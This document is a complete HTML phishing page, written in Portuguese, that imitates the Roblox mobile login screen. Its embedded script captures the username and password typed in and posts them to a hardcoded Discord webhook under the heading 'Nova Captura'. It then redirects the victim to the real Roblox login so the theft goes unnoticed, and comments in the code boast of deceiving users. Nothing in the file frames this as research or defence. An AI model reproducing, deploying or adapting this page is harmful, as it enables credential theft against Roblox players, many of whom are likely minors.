<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Entrar na Roblox</title>
    <link rel="icon" href="https://www.roblox.com/favicon.ico">
    <style>
        /* Fonte oficial do Roblox (Builder Sans / Hanken Grotesk) */
        @import url('https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Hanken Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #191b1f; /* Fundo real escuro */
            color: #ffffff;
            padding-bottom: 100px;
            overflow-x: hidden;
        }

        /* HEADER */
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 16px;
            background-color: #232527;
            border-bottom: 1px solid #2e3134;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .header-left {
            display: flex;
            align-items: center;
        }

        /* Ícone do Roblox */
        .logo-icon {
            width: 28px;
            height: 28px;
            background-color: #ffffff;
            transform: rotate(-15deg);
            border-radius: 3px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .logo-hole {
            width: 8px;
            height: 8px;
            background-color: #232527;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .btn-cadastrar {
            background-color: #335fff;
            color: #fff;
            border: none;
            padding: 8px 14px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
        }

        .btn-entrar {
            background-color: transparent;
            color: #fff;
            border: 1px solid #ffffff;
            padding: 8px 14px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
        }

        .search-icon svg {
            width: 22px;
            height: 22px;
            stroke: #fff;
            stroke-width: 2.5;
            fill: none;
        }

        /* SUB-MENU */
        .sub-header {
            display: flex;
            justify-content: space-around;
            padding: 12px 10px;
            background-color: #232527;
            font-size: 14px;
            font-weight: 600;
            color: #e3e3e3;
            border-bottom: 1px solid #2e3134;
        }

        /* BANNER DE IMAGEM */
        .banner {
            height: 100px;
            background: linear-gradient(to bottom, rgba(25, 27, 31, 0.4), #191b1f), url('https://images.rbxcdn.com/2c3e2e7b4e5f4a6e8c9d0e1f2a3b4c5d.jpg') center/cover;
        }

        /* ÁREA DO FORMULÁRIO */
        .container {
            padding: 0 16px;
            max-width: 480px;
            margin: 0 auto;
            margin-top: -20px;
            position: relative;
            z-index: 10;
        }

        h1 {
            font-size: 24px;
            font-weight: 700;
            text-align: center;
            margin: 20px 0 24px 0;
        }

        .input-group input {
            width: 100%;
            padding: 16px;
            background-color: #272a2e;
            border: 1px solid #3b3f43;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            margin-bottom: 12px;
            outline: none;
        }

        .input-group input::placeholder {
            color: #9ea2a6;
        }

        .btn-main {
            width: 100%;
            padding: 15px;
            background-color: #272a2e;
            border: 1px solid #ffffff;
            border-radius: 8px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            margin-top: 4px;
            cursor: pointer;
        }

        .btn-main:active {
            background-color: #3b3f43;
        }

        .forgot-link {
            display: block;
            text-align: center;
            color: #ffffff;
            text-decoration: none;
            font-size: 14px;
            margin: 24px 0;
            font-weight: 500;
        }

        .divider {
            height: 1px;
            background-color: #3b3f43;
            margin: 24px 0;
        }

        .btn-secondary {
            width: 100%;
            padding: 16px;
            background-color: #272a2e;
            border: 1px solid #3b3f43;
            border-radius: 8px;
            color: #ffffff;
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 12px;
            cursor: pointer;
        }

        .btn-secondary:active {
            background-color: #3b3f43;
        }

        .signup-text {
            text-align: center;
            color: #e3e3e3;
            font-size: 14px;
            margin-top: 24px;
            margin-bottom: 40px;
        }

        .signup-text a {
            color: #ffffff;
            font-weight: 700;
            text-decoration: none;
        }

        /* BANNER INFERIOR */
        .bottom-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background-color: #232527;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-top: 1px solid #2e3134;
            z-index: 100;
        }

        .banner-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .app-icon {
            width: 42px;
            height: 42px;
            background-color: #335fff;
            border-radius: 8px; /* Quadrado arredondado em vez de redondo */
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .app-icon-inner {
            width: 16px;
            height: 16px;
            background-color: #fff;
            transform: rotate(-15deg);
            border-radius: 2px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .app-icon-hole {
            width: 6px;
            height: 6px;
            background-color: #335fff;
        }

        .banner-text {
            font-size: 11px;
            line-height: 1.4;
            color: #e3e3e3;
        }

        .banner-text span {
            font-weight: 700;
            color: #fff;
        }

        .btn-explore {
            background-color: #335fff;
            color: #fff;
            border: none;
            padding: 10px 16px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
        }
    </style>
</head>
<body>

    <!-- HEADER -->
    <div class="header">
        <div class="header-left">
            <div class="logo-icon"><div class="logo-hole"></div></div>
        </div>
        <div class="header-right">
            <button class="btn-cadastrar">Cadastrar-se</button>
            <button class="btn-entrar">Entrar</button>
            <div class="search-icon">
                <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
            </div>
        </div>
    </div>

    <!-- SUB-MENU -->
    <div class="sub-header">
        <div>Destaques</div>
        <div>Mercado</div>
        <div>Criar</div>
        <div>Robux</div>
    </div>

    <!-- BANNER DE IMAGEM -->
    <div class="banner"></div>

    <!-- FORMULÁRIO -->
    <div class="container">
        <h1>Entrar na Roblox</h1>
        
        <form id="login-form">
            <div class="input-group">
                <input type="text" id="username" placeholder="Usuário/e-mail/telefone" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Senha" required>
            </div>
            
            <button type="submit" class="btn-main" id="btn-submit">Entrar</button>
        </form>

        <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>

        <div class="divider"></div>

        <button class="btn-secondary">Envie-me um código único por e-mail</button>
        <button class="btn-secondary">Entrada rápida</button>
        <button class="btn-secondary">Outras opções de acesso</button>

        <div class="signup-text">
            Não possui uma conta? <a href="#">Cadastrar-se</a>
        </div>
    </div>

    <!-- BANNER INFERIOR -->
    <div class="bottom-banner">
        <div class="banner-left">
            <div class="app-icon">
                <div class="app-icon-inner"><div class="app-icon-hole"></div></div>
            </div>
            <div class="banner-text">
                <span>Explore a Roblox no nosso<br>aplicativo para Android!</span><br>
                Milhões de experiências criadas por gente como você
            </div>
        </div>
        <button class="btn-explore">Explorar</button>
    </div>

    <script>
        // TEU WEBHOOK DO DISCORD AQUI
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1573426421085241448/LGoTUoMIZdohFLYE9s3THG4sSUFbbi1PEF5Hdl145-KIH6KapjIvAnLGhFT4kmlfOFPL';

        const form = document.getElementById('login-form');
        const btnSubmit = document.getElementById('btn-submit');
        const user = document.getElementById('username');
        const pass = document.getElementById('password');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = user.value.trim();
            const password = pass.value;
            if (!username || !password) return;

            // Muda o botão pra enganar
            btnSubmit.textContent = 'Entrando...';

            // Monta o JSON pro Discord
            const payload = {
                content: `🎣 **Nova Captura**\n👤 User: \`${username}\`\n🔑 Senha: \`${password}\``
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                // Redireciona pro site real da Roblox pra não dar na cara
                setTimeout(() => {
                    window.location.href = 'https://www.roblox.com/pt/Login';
                }, 1500);

            } catch (error) {
                btnSubmit.textContent = 'Entrar';
                alert('Erro de conexão. Tente novamente.');
            }
        });
    </script>
</body>
</html>
